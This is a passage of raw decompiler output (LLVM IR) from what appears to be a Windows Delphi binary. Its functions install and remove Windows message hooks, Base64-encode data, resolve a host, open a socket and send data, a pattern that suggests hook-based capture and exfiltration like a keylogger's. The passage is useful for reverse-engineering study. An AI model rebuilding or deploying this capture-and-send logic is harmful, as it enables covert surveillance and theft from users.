  %10 = load i32, i32* %9, align 4, !insn.addr !727
  %11 = icmp eq i32 %10, 2, !insn.addr !728
  %12 = icmp eq i1 %11, false, !insn.addr !729
  br i1 %12, label %dec_label_pc_4052e0, label %dec_label_pc_4052d8, !insn.addr !729

dec_label_pc_4052d8:                              ; preds = %dec_label_pc_4052ce
  %13 = call i32 @function_4051b0(i32 %1, i32 %2, i32 %0), !insn.addr !730
  br label %dec_label_pc_4052e0, !insn.addr !730

dec_label_pc_4052e0:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052d8, %dec_label_pc_4052ce
  %14 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !731
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !732
  %16 = call i32 @CallNextHookEx(i32* %15, i32 %arg2, i32 %arg3, i32 %14), !insn.addr !732
  ret i32 %16, !insn.addr !733
}

define i32 @function_4052f8() local_unnamed_addr {
dec_label_pc_4052f8:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4215364 to i32*), i32 3), !insn.addr !734
  %2 = ptrtoint i32* %1 to i32, !insn.addr !734
  store i32 %2, i32* @global_var_4096ac, align 4, !insn.addr !735
  %3 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %4 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %3, i32* inttoptr (i32 4215472 to i32*), i32 4), !insn.addr !736
  %5 = ptrtoint i32* %4 to i32, !insn.addr !736
  store i32 %5, i32* @global_var_4096b0, align 4, !insn.addr !737
  ret i32 %5, !insn.addr !738
}

define i32 @function_405330() local_unnamed_addr {
dec_label_pc_405330:
  %0 = load i32, i32* @global_var_4096ac, align 4, !insn.addr !739
  %1 = inttoptr i32 %0 to i32*, !insn.addr !740
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !740
  %3 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !741
  %4 = inttoptr i32 %3 to i32*, !insn.addr !742
  %5 = call i1 @UnhookWindowsHookEx(i32* %4), !insn.addr !742
  %6 = sext i1 %5 to i32, !insn.addr !742
  ret i32 %6, !insn.addr !743
}

define i32 @function_405348() local_unnamed_addr {
dec_label_pc_405348:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !744
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !744
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !744
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !745
  %2 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !746
  %3 = add i32 %2, 1, !insn.addr !746
  store i32 %3, i32* @global_var_4096a8, align 4, !insn.addr !746
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !747
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !748
  ret i32 0, !insn.addr !749
}

define i32 @function_40536d() local_unnamed_addr {
dec_label_pc_40536d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !750
  ret i32 %0, !insn.addr !750
}

define i32 @function_405372() local_unnamed_addr {
dec_label_pc_405372:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !751
}

define i32 @function_405374(i32 %arg1) local_unnamed_addr {
dec_label_pc_405374:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !752
}

define i32 @function_405378() local_unnamed_addr {
dec_label_pc_405378:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a8, align 4, !insn.addr !753
  %2 = add i32 %1, -1, !insn.addr !753
  store i32 %2, i32* @global_var_4096a8, align 4, !insn.addr !753
  ret i32 %0, !insn.addr !754
}

define i32 @function_405383(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405383:
  %storemerge.reg2mem = alloca i32, !insn.addr !755
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !755
  %5 = inttoptr i32 %3 to i32*, !insn.addr !755
  store i32 %4, i32* %5, align 4, !insn.addr !755
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !756
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !756
  %10 = add i8 %7, %9, !insn.addr !756
  %11 = inttoptr i32 %8 to i8*, !insn.addr !756
  store i8 %10, i8* %11, align 1, !insn.addr !756
  %12 = load i32, i32* %eax, align 4, !insn.addr !757
  store i32 %arg1, i32* %eax, align 4, !insn.addr !758
  %13 = add i32 %12, 99, !insn.addr !759
  %14 = inttoptr i32 %13 to i64*, !insn.addr !759
  %15 = load i64, i64* %14, align 4, !insn.addr !759
  %16 = call i32 @__asm_bound(i64 %15), !insn.addr !759
  %17 = add i32 %16, -2, !insn.addr !760
  %18 = inttoptr i32 %17 to i16*, !insn.addr !760
  store i16 27241, i16* %18, align 2, !insn.addr !760
  %19 = mul i32 %2, 2, !insn.addr !761
  %20 = add i32 %2, 110, !insn.addr !761
  %21 = add i32 %20, %19, !insn.addr !761
  %22 = inttoptr i32 %21 to i32*, !insn.addr !761
  %23 = load i32, i32* %22, align 4, !insn.addr !761
  %24 = sext i32 %23 to i64, !insn.addr !761
  %25 = mul nsw i64 %24, 111, !insn.addr !761
  %26 = mul i64 %24, 476741369856
  %27 = sdiv i64 %26, 4294967296, !insn.addr !761
  %28 = icmp eq i64 %25, %27, !insn.addr !761
  br i1 %28, label %dec_label_pc_4053b5, label %dec_label_pc_405424, !insn.addr !762

dec_label_pc_4053b5:                              ; preds = %dec_label_pc_405383
  %29 = icmp eq i32 %0, 0, !insn.addr !763
  br i1 %29, label %dec_label_pc_40542c, label %dec_label_pc_4053b9, !insn.addr !764

dec_label_pc_4053b9:                              ; preds = %dec_label_pc_4053b5
  %30 = icmp slt i32 %0, 0, !insn.addr !763
  br i1 %30, label %dec_label_pc_405434, label %dec_label_pc_4053bb, !insn.addr !765

dec_label_pc_4053bb:                              ; preds = %dec_label_pc_4053b9
  %31 = trunc i32 %0 to i8, !insn.addr !763
  %32 = call i8 @llvm.ctpop.i8(i8 %31), !range !510, !insn.addr !763
  %33 = and i8 %32, 1, !insn.addr !763
  %34 = icmp eq i8 %33, 0, !insn.addr !763
  br i1 %34, label %dec_label_pc_4053ed, label %dec_label_pc_4053bd, !insn.addr !766

dec_label_pc_4053bd:                              ; preds = %dec_label_pc_4053bb
  %35 = add i32 %12, -1, !insn.addr !757
  %36 = inttoptr i32 %arg3 to i32*, !insn.addr !767
  %37 = load i32, i32* %36, align 4, !insn.addr !767
  %38 = xor i32 %37, %1, !insn.addr !767
  store i32 %38, i32* %36, align 4, !insn.addr !767
  %39 = add i32 %1, 959985462, !insn.addr !768
  %40 = inttoptr i32 %39 to i32*, !insn.addr !768
  %41 = load i32, i32* %40, align 4, !insn.addr !768
  %42 = xor i32 %41, %1, !insn.addr !768
  %43 = add i32 %16, -38, !insn.addr !769
  %44 = inttoptr i32 %43 to i32*, !insn.addr !769
  store i32 %35, i32* %44, align 4, !insn.addr !769
  %45 = add i32 %16, -42, !insn.addr !770
  %46 = inttoptr i32 %45 to i32*, !insn.addr !770
  store i32 %42, i32* %46, align 4, !insn.addr !770
  %47 = add i32 %16, -22, !insn.addr !771
  %48 = inttoptr i32 %47 to i32*, !insn.addr !771
  store i32 0, i32* %48, align 4, !insn.addr !771
  %49 = add i32 %16, -26, !insn.addr !772
  %50 = inttoptr i32 %49 to i32*, !insn.addr !772
  store i32 0, i32* %50, align 4, !insn.addr !772
  %51 = add i32 %16, -30, !insn.addr !773
  %52 = inttoptr i32 %51 to i32*, !insn.addr !773
  store i32 0, i32* %52, align 4, !insn.addr !773
  %53 = add i32 %16, -34, !insn.addr !774
  %54 = inttoptr i32 %53 to i32*, !insn.addr !774
  store i32 0, i32* %54, align 4, !insn.addr !774
  %55 = add i32 %16, -6, !insn.addr !775
  %56 = inttoptr i32 %55 to i32*, !insn.addr !775
  store i32 %arg3, i32* %56, align 4, !insn.addr !775
  %57 = add i32 %16, -46, !insn.addr !776
  %58 = inttoptr i32 %57 to i32*, !insn.addr !776
  store i32 %17, i32* %58, align 4, !insn.addr !776
  ret i32 0, !insn.addr !776

dec_label_pc_4053ed:                              ; preds = %dec_label_pc_4053bb
  %59 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !777
  %60 = trunc i64 %25 to i32, !insn.addr !761
  %61 = load i32, i32* %eax, align 4, !insn.addr !778
  %62 = add i32 %61, 1, !insn.addr !778
  %63 = mul i32 %59, 8, !insn.addr !779
  %64 = add i32 %59, 48, !insn.addr !779
  %65 = add i32 %64, %63, !insn.addr !779
  %66 = inttoptr i32 %65 to i8*, !insn.addr !779
  %67 = load i8, i8* %66, align 4, !insn.addr !779
  %68 = udiv i32 %62, 256, !insn.addr !779
  %69 = trunc i32 %68 to i8, !insn.addr !779
  %70 = add i8 %67, %69, !insn.addr !779
  store i8 %70, i8* %66, align 4, !insn.addr !779
  call void @__writefsdword(i32 %62, i32 %17), !insn.addr !780
  %71 = call i32 @"@LStrClr"(), !insn.addr !781
  %72 = call i32 @function_4034c8(), !insn.addr !782
  %73 = add i32 %60, -8, !insn.addr !783
  %74 = inttoptr i32 %73 to i32*, !insn.addr !783
  store i32 %72, i32* %74, align 4, !insn.addr !783
  %75 = ashr i32 %72, 31, !insn.addr !784
  %76 = zext i32 %72 to i64, !insn.addr !785
  %77 = zext i32 %75 to i64, !insn.addr !785
  %78 = mul i64 %77, 4294967296, !insn.addr !785
  %79 = or i64 %78, %76, !insn.addr !785
  %80 = sdiv i64 %79, 3, !insn.addr !785
  %81 = trunc i64 %80 to i32, !insn.addr !785
  store i32 %81, i32* %eax, align 4, !insn.addr !785
  %82 = srem i64 %79, 3, !insn.addr !785
  %83 = trunc i64 %82 to i32, !insn.addr !785
  %84 = icmp eq i32 %83, 0, !insn.addr !786
  %85 = icmp eq i1 %84, false, !insn.addr !787
  br i1 %85, label %dec_label_pc_405423, label %dec_label_pc_405416, !insn.addr !787

dec_label_pc_405416:                              ; preds = %dec_label_pc_4053ed
  %86 = load i32, i32* %74, align 4, !insn.addr !788
  %87 = ashr i32 %86, 31, !insn.addr !789
  %88 = zext i32 %86 to i64, !insn.addr !790
  %89 = zext i32 %87 to i64, !insn.addr !790
  %90 = mul i64 %89, 4294967296, !insn.addr !790
  %91 = or i64 %90, %88, !insn.addr !790
  %92 = sdiv i64 %91, 3, !insn.addr !790
  %93 = trunc i64 %92 to i32, !insn.addr !790
  store i32 %93, i32* %storemerge.reg2mem, !insn.addr !791
  br label %dec_label_pc_405430, !insn.addr !791

dec_label_pc_405423:                              ; preds = %dec_label_pc_4053ed
  ret i32 %81, !insn.addr !791

dec_label_pc_405424:                              ; preds = %dec_label_pc_405383
  %94 = load i32, i32* %eax, align 4, !insn.addr !792
  ret i32 %94, !insn.addr !792

dec_label_pc_40542c:                              ; preds = %dec_label_pc_4053b5
  %95 = load i32, i32* %eax, align 4, !insn.addr !793
  %96 = zext i32 %95 to i64, !insn.addr !793
  %97 = zext i32 %arg3 to i64, !insn.addr !793
  %98 = mul i64 %97, 4294967296, !insn.addr !793
  %99 = or i64 %98, %96, !insn.addr !793
  %100 = zext i32 %arg2 to i64, !insn.addr !793
  %101 = sdiv i64 %99, %100, !insn.addr !793
  %102 = trunc i64 %101 to i32, !insn.addr !793
  %103 = add i32 %102, 1, !insn.addr !794
  store i32 %103, i32* %storemerge.reg2mem, !insn.addr !794
  br label %dec_label_pc_405430, !insn.addr !794

dec_label_pc_405430:                              ; preds = %dec_label_pc_405416, %dec_label_pc_40542c
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %104 = add i32 %storemerge.reload, -1, !insn.addr !795
  ret i32 %104, !insn.addr !796

dec_label_pc_405434:                              ; preds = %dec_label_pc_4053b9
  %105 = inttoptr i32 %1 to i32*, !insn.addr !797
  %106 = load i32, i32* %105, align 4, !insn.addr !797
  store i32 %106, i32* %stack_var_-16, align 4, !insn.addr !797
  %107 = load i32, i32* %eax, align 4
  %108 = inttoptr i32 %107 to i32*, !insn.addr !798
  %109 = load i32, i32* %108, align 4, !insn.addr !798
  %110 = add i32 %109, %107, !insn.addr !798
  store i32 %110, i32* %108, align 4, !insn.addr !798
  %111 = load i32, i32* %eax, align 4
  %112 = add i32 %111, -119, !insn.addr !799
  %113 = inttoptr i32 %112 to i8*, !insn.addr !799
  %114 = load i8, i8* %113, align 1, !insn.addr !799
  %115 = trunc i32 %111 to i8, !insn.addr !799
  %116 = add i8 %114, %115, !insn.addr !799
  store i8 %116, i8* %113, align 1, !insn.addr !799
  %117 = load i32, i32* %eax, align 4, !insn.addr !800
  ret i32 %117, !insn.addr !800
}

define i32 @function_40543c() local_unnamed_addr {
dec_label_pc_40543c:
  %ebx.0.reg2mem = alloca i32, !insn.addr !801
  %esp.0.reg2mem = alloca i32, !insn.addr !801
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = add i32 %1, -8, !insn.addr !802
  %3 = inttoptr i32 %2 to i32*, !insn.addr !802
  %4 = add i32 %1, -9
  %5 = inttoptr i32 %4 to i8*
  %6 = add i32 %1, -10
  %7 = inttoptr i32 %6 to i8*
  %8 = add i32 %1, -11
  %9 = inttoptr i32 %8 to i8*
  %10 = add i32 %1, -12
  %11 = inttoptr i32 %10 to i8*
  %12 = add i32 %1, -4, !insn.addr !803
  %13 = inttoptr i32 %12 to i32*, !insn.addr !803
  %14 = add i32 %1, -20
  %15 = inttoptr i32 %14 to i32*
  %16 = add i32 %1, -24
  %17 = inttoptr i32 %16 to i32*
  %18 = add i32 %1, -28
  %19 = inttoptr i32 %18 to i32*
  %20 = add i32 %1, -32
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %1, -16
  %23 = inttoptr i32 %22 to i32*
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !801
  br label %dec_label_pc_40543e, !insn.addr !801

dec_label_pc_40543e:                              ; preds = %dec_label_pc_405589, %dec_label_pc_40543c
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = mul i32 %ebx.0.reload, 3, !insn.addr !804
  %25 = add i32 %24, 3, !insn.addr !805
  %26 = load i32, i32* %3, align 4, !insn.addr !802
  %27 = icmp sgt i32 %25, %26, !insn.addr !806
  br i1 %27, label %dec_label_pc_4054de, label %dec_label_pc_40544f, !insn.addr !806

dec_label_pc_40544f:                              ; preds = %dec_label_pc_40543e
  %28 = add i32 %24, %0, !insn.addr !807
  %29 = inttoptr i32 %28 to i8*, !insn.addr !807
  %30 = load i8, i8* %29, align 1, !insn.addr !807
  %31 = udiv i8 %30, 4
  %32 = zext i8 %31 to i32, !insn.addr !808
  %33 = add i32 %32, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !809
  %34 = inttoptr i32 %33 to i8*, !insn.addr !809
  %35 = load i8, i8* %34, align 1, !insn.addr !809
  store i8 %35, i8* %5, align 1, !insn.addr !810
  %36 = load i8, i8* %29, align 1, !insn.addr !811
  %37 = mul i8 %36, 16, !insn.addr !812
  %38 = and i8 %37, 48, !insn.addr !813
  %39 = add i32 %28, 1, !insn.addr !814
  %40 = inttoptr i32 %39 to i8*, !insn.addr !814
  %41 = load i8, i8* %40, align 1, !insn.addr !814
  %42 = udiv i8 %41, 16
  %43 = or i8 %42, %38, !insn.addr !815
  %44 = zext i8 %43 to i32, !insn.addr !815
  %45 = add i32 %44, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !816
  %46 = inttoptr i32 %45 to i8*, !insn.addr !816
  %47 = load i8, i8* %46, align 1, !insn.addr !816
  store i8 %47, i8* %7, align 1, !insn.addr !817
  %48 = load i8, i8* %40, align 1, !insn.addr !818
  %49 = mul i8 %48, 4, !insn.addr !819
  %50 = and i8 %49, 60, !insn.addr !820
  %51 = add i32 %28, 2, !insn.addr !821
  %52 = inttoptr i32 %51 to i8*, !insn.addr !821
  %53 = load i8, i8* %52, align 1, !insn.addr !821
  %54 = udiv i8 %53, 64, !insn.addr !822
  %55 = or i8 %54, %50, !insn.addr !823
  %56 = zext i8 %55 to i32, !insn.addr !823
  %57 = add i32 %56, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !824
  %58 = inttoptr i32 %57 to i8*, !insn.addr !824
  %59 = load i8, i8* %58, align 1, !insn.addr !824
  store i8 %59, i8* %9, align 1, !insn.addr !825
  %60 = and i8 %53, 63, !insn.addr !826
  %61 = zext i8 %60 to i32, !insn.addr !826
  %62 = add i32 %61, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !827
  %63 = inttoptr i32 %62 to i8*, !insn.addr !827
  %64 = load i8, i8* %63, align 1, !insn.addr !827
  store i8 %64, i8* %11, align 1, !insn.addr !828
  br label %dec_label_pc_405589, !insn.addr !829

dec_label_pc_4054de:                              ; preds = %dec_label_pc_40543e
  %65 = add i32 %24, 2, !insn.addr !830
  %66 = icmp sgt i32 %65, %26, !insn.addr !831
  %67 = add i32 %24, %0
  %68 = inttoptr i32 %67 to i8*
  %69 = load i8, i8* %68, align 1
  %70 = udiv i8 %69, 4
  %71 = zext i8 %70 to i32
  %72 = add i32 %71, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32)
  %73 = inttoptr i32 %72 to i8*
  %74 = load i8, i8* %73, align 1
  store i8 %74, i8* %5, align 1
  %75 = load i8, i8* %68, align 1
  br i1 %66, label %dec_label_pc_40554d, label %dec_label_pc_4054e8, !insn.addr !831

dec_label_pc_4054e8:                              ; preds = %dec_label_pc_4054de
  %76 = mul i8 %75, 16, !insn.addr !832
  %77 = and i8 %76, 48, !insn.addr !833
  %78 = add i32 %67, 1, !insn.addr !834
  %79 = inttoptr i32 %78 to i8*, !insn.addr !834
  %80 = load i8, i8* %79, align 1, !insn.addr !834
  %81 = zext i8 %80 to i32, !insn.addr !834
  %82 = udiv i8 %80, 16, !insn.addr !835
  %83 = or i8 %82, %77, !insn.addr !836
  %84 = zext i8 %83 to i32, !insn.addr !836
  %85 = add i32 %84, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !837
  %86 = inttoptr i32 %85 to i8*, !insn.addr !837
  %87 = load i8, i8* %86, align 1, !insn.addr !837
  store i8 %87, i8* %7, align 1, !insn.addr !838
  %88 = mul i32 %81, 4, !insn.addr !839
  %89 = and i32 %88, 60, !insn.addr !840
  %90 = add i32 %89, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !841
  %91 = inttoptr i32 %90 to i8*, !insn.addr !841
  %92 = load i8, i8* %91, align 4, !insn.addr !841
  store i8 %92, i8* %9, align 1, !insn.addr !842
  store i8 61, i8* %11, align 1, !insn.addr !843
  br label %dec_label_pc_405589, !insn.addr !844

dec_label_pc_40554d:                              ; preds = %dec_label_pc_4054de
  %93 = zext i8 %75 to i32, !insn.addr !845
  %94 = mul i32 %93, 16, !insn.addr !846
  %95 = and i32 %94, 48, !insn.addr !847
  %96 = add i32 %95, ptrtoint ([64 x i8]* @B64EncodeTable_at_405388 to i32), !insn.addr !848
  %97 = inttoptr i32 %96 to i8*, !insn.addr !848
  %98 = load i8, i8* %97, align 16, !insn.addr !848
  store i8 %98, i8* %7, align 1, !insn.addr !849
  store i8 61, i8* %9, align 1, !insn.addr !850
  store i8 61, i8* %11, align 1, !insn.addr !851
  br label %dec_label_pc_405589, !insn.addr !851

dec_label_pc_405589:                              ; preds = %dec_label_pc_40554d, %dec_label_pc_4054e8, %dec_label_pc_40544f
  %99 = load i32, i32* %13, align 4, !insn.addr !803
  %100 = inttoptr i32 %99 to i32*, !insn.addr !852
  %101 = load i32, i32* %100, align 4, !insn.addr !852
  %102 = add i32 %esp.0.reload, -4, !insn.addr !852
  %103 = inttoptr i32 %102 to i32*, !insn.addr !852
  store i32 %101, i32* %103, align 4, !insn.addr !852
  %104 = call i32 @"@LStrFromChar"(), !insn.addr !853
  %105 = load i32, i32* %15, align 4, !insn.addr !854
  %106 = add i32 %esp.0.reload, -8, !insn.addr !854
  %107 = inttoptr i32 %106 to i32*, !insn.addr !854
  store i32 %105, i32* %107, align 4, !insn.addr !854
  %108 = call i32 @"@LStrFromChar"(), !insn.addr !855
  %109 = load i32, i32* %17, align 4, !insn.addr !856
  %110 = add i32 %esp.0.reload, -12, !insn.addr !856
  %111 = inttoptr i32 %110 to i32*
  store i32 %109, i32* %111, align 4, !insn.addr !856
  %112 = call i32 @"@LStrFromChar"(), !insn.addr !857
  %113 = load i32, i32* %19, align 4, !insn.addr !858
  %114 = add i32 %esp.0.reload, -16, !insn.addr !858
  %115 = inttoptr i32 %114 to i32*, !insn.addr !858
  store i32 %113, i32* %115, align 4, !insn.addr !858
  %116 = call i32 @"@LStrFromChar"(), !insn.addr !859
  %117 = load i32, i32* %21, align 4, !insn.addr !860
  %118 = add i32 %esp.0.reload, -20, !insn.addr !860
  %119 = inttoptr i32 %118 to i32*
  store i32 %117, i32* %119, align 4, !insn.addr !860
  %120 = call i32 @"@LStrCatN"(), !insn.addr !861
  %121 = add i32 %ebx.0.reload, 1, !insn.addr !862
  %122 = load i32, i32* %23, align 4, !insn.addr !863
  %123 = add i32 %122, -1, !insn.addr !863
  %124 = icmp eq i32 %123, 0, !insn.addr !863
  store i32 %123, i32* %23, align 4, !insn.addr !863
  %125 = icmp eq i1 %124, false, !insn.addr !864
  store i32 %118, i32* %esp.0.reg2mem, !insn.addr !864
  store i32 %121, i32* %ebx.0.reg2mem, !insn.addr !864
  br i1 %125, label %dec_label_pc_40543e, label %dec_label_pc_4055dd, !insn.addr !864

dec_label_pc_4055dd:                              ; preds = %dec_label_pc_405589
  %126 = load i32, i32* %119, align 4, !insn.addr !865
  call void @__writefsdword(i32 0, i32 %126), !insn.addr !866
  store i32 4216319, i32* %111, align 4, !insn.addr !867
  %127 = call i32 @"@LStrArrayClr"(), !insn.addr !868
  ret i32 %127, !insn.addr !869
}

define i32 @function_4055f8() local_unnamed_addr {
dec_label_pc_4055f8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !870
  ret i32 %0, !insn.addr !870
}

define i32 @function_4055fd() local_unnamed_addr {
dec_label_pc_4055fd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !871
}

define i32 @function_4055ff(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4055ff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !872
}

define i32 @function_405608() local_unnamed_addr {
dec_label_pc_405608:
  %stack_var_-12.0.reg2mem = alloca i32, !insn.addr !873
  %0 = call i32 @function_4036c8(), !insn.addr !874
  %1 = inttoptr i32 %0 to i8*, !insn.addr !875
  %2 = call %hostent* @gethostbyname(i8* %1), !insn.addr !876
  %3 = call i32 @"@FillChar"(), !insn.addr !877
  %4 = icmp eq %hostent* %2, null, !insn.addr !878
  br i1 %4, label %dec_label_pc_405653, label %dec_label_pc_405631, !insn.addr !879

dec_label_pc_405631:                              ; preds = %dec_label_pc_405608
  %5 = ptrtoint %hostent* %2 to i32, !insn.addr !876
  %6 = add i32 %5, 12, !insn.addr !880
  %7 = inttoptr i32 %6 to i32*, !insn.addr !880
  %8 = load i32, i32* %7, align 4, !insn.addr !880
  %9 = inttoptr i32 %8 to i32*, !insn.addr !881
  %10 = load i32, i32* %9, align 4, !insn.addr !881
  %11 = inttoptr i32 %10 to i8*, !insn.addr !882
  %12 = load i8, i8* %11, align 1, !insn.addr !882
  %13 = sext i8 %12 to i32, !insn.addr !883
  store i32 %13, i32* %stack_var_-12.0.reg2mem, !insn.addr !884
  br label %dec_label_pc_405653, !insn.addr !884

dec_label_pc_405653:                              ; preds = %dec_label_pc_405631, %dec_label_pc_405608
  %stack_var_-12.0.reload = load i32, i32* %stack_var_-12.0.reg2mem
  ret i32 %stack_var_-12.0.reload, !insn.addr !885
}

define i32 @function_405664() local_unnamed_addr {
dec_label_pc_405664:
  %esp.0.reg2mem = alloca i32, !insn.addr !886
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-488 = alloca i32, align 4
  %stack_var_-472 = alloca i32, align 4
  %stack_var_-412 = alloca i32, align 4
  %stack_var_-452 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !887
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !888
  store i32 %2, i32* %stack_var_-452, align 4, !insn.addr !888
  %3 = ptrtoint i32* %stack_var_-452 to i32, !insn.addr !888
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !889
  %4 = ptrtoint i32* %stack_var_-412 to i32, !insn.addr !890
  %5 = trunc i32 %4 to i16, !insn.addr !890
  %6 = call i32 @WSAStartup(i16 %5, %WSAData* inttoptr (i32 257 to %WSAData*)), !insn.addr !891
  store i32 2, i32* %stack_var_-472, align 4, !insn.addr !892
  %7 = ptrtoint i32* %stack_var_-472 to i32, !insn.addr !892
  %8 = call i32 @socket(i32 0, i32 1, i32 2), !insn.addr !893
  %9 = icmp eq i32 %8, -1, !insn.addr !894
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !895
  br i1 %9, label %dec_label_pc_4056f2, label %dec_label_pc_4056b3, !insn.addr !895

dec_label_pc_4056b3:                              ; preds = %dec_label_pc_405664
  %10 = call i32 @function_405608(), !insn.addr !896
  %11 = trunc i32 %10 to i16, !insn.addr !897
  %12 = call i16 @htons(i16 %11), !insn.addr !897
  store i32 %8, i32* %stack_var_-488, align 4, !insn.addr !898
  %13 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !898
  %14 = sext i16 %12 to i32, !insn.addr !899
  %15 = call i32 @connect(i32 %14, %sockaddr* bitcast (i32* @0 to %sockaddr*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !899
  %16 = icmp eq i32 %15, 0, !insn.addr !900
  %17 = icmp eq i1 %16, false, !insn.addr !901
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !901
  br i1 %17, label %dec_label_pc_4056f2, label %dec_label_pc_4056ea, !insn.addr !901

dec_label_pc_4056ea:                              ; preds = %dec_label_pc_4056b3
  %18 = inttoptr i32 %0 to i32*, !insn.addr !902
  store i32 %8, i32* %18, align 4, !insn.addr !902
  store i32 %13, i32* %esp.0.reg2mem, !insn.addr !903
  br label %dec_label_pc_4056f2, !insn.addr !903

dec_label_pc_4056f2:                              ; preds = %dec_label_pc_4056ea, %dec_label_pc_4056b3, %dec_label_pc_405664
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %19 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !904
  %20 = load i32, i32* %19, align 4, !insn.addr !904
  call void @__writefsdword(i32 0, i32 %20), !insn.addr !905
  %21 = add i32 %esp.0.reload, 8, !insn.addr !906
  %22 = inttoptr i32 %21 to i32*, !insn.addr !906
  store i32 4216591, i32* %22, align 4, !insn.addr !906
  %23 = call i32 @"@LStrClr"(), !insn.addr !907
  ret i32 %23, !insn.addr !908
}

define i32 @function_405708() local_unnamed_addr {
dec_label_pc_405708:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !909
  ret i32 %0, !insn.addr !909
}

define i32 @function_40570d() local_unnamed_addr {
dec_label_pc_40570d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !910
}

define i32 @function_40570f(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40570f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !911
}

define i32 @function_405718() local_unnamed_addr {
dec_label_pc_405718:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @closesocket(i32 %0), !insn.addr !912
  %2 = call i32 @WSACleanup(), !insn.addr !913
  ret i32 %2, !insn.addr !914
}

define i32 @function_405724() local_unnamed_addr {
dec_label_pc_405724:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4105 = alloca i32, align 4
  %stack_var_-4124 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !915
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !916
  store i32 %2, i32* %stack_var_-4124, align 4, !insn.addr !916
  %3 = ptrtoint i32* %stack_var_-4124 to i32, !insn.addr !916
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !917
  %4 = call i32 @function_4036c8(), !insn.addr !918
  %5 = call i32 @StrCopy(), !insn.addr !919
  %6 = call i32 @function_406fcc(i32 4), !insn.addr !920
  %7 = bitcast i32* %stack_var_-4105 to i8*
  %8 = call i32 @send(i32 %6, i8* nonnull %7, i32 %0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !921
  call void @__writefsdword(i32 0, i32 %0), !insn.addr !922
  %9 = call i32 @"@LStrClr"(), !insn.addr !923
  ret i32 %9, !insn.addr !924
}

define i32 @function_405795() local_unnamed_addr {
dec_label_pc_405795:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !925
  ret i32 %0, !insn.addr !925
}

define i32 @function_40579a() local_unnamed_addr {
dec_label_pc_40579a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !926
}

define i32 @function_40579c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40579c:
